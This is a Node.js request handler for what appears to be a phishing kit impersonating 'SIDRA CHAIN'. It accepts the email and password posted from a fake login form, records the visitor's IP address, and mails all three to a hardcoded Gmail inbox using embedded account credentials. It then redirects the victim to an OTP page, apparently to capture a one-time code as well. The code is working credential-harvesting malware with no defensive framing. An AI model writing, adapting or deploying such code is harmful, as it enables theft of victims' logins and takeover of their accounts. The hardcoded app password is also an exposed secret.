const nodemailer = require("nodemailer");

export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({ error: "Method Not Allowed" });
    }

    const { email, password } = req.body;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

    const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: "nwankwogoodluck156@gmail.com",  // Replace with your email
            pass: "nwub nfwt hbpq hdim",  // Replace with your email password or app password
        },
    });

    const mailOptions = {
        from: "your-email@gmail.com",
        to: "nwankwogoodluck156@gmail.com",
        subject: "SIDRA CHAIN - Login Credentials",
        text: `This is the login credentials:\nEMAIL: ${email}\nPASSWORD: ${password}\nIP ADDRESS: ${ip}`,
    };

    try {
        await transporter.sendMail(mailOptions);
        res.writeHead(302, { Location: "/otp.html" });
        res.end();
    } catch (error) {
        res.status(500).json({ error: "Failed to send email" });
    }
          }
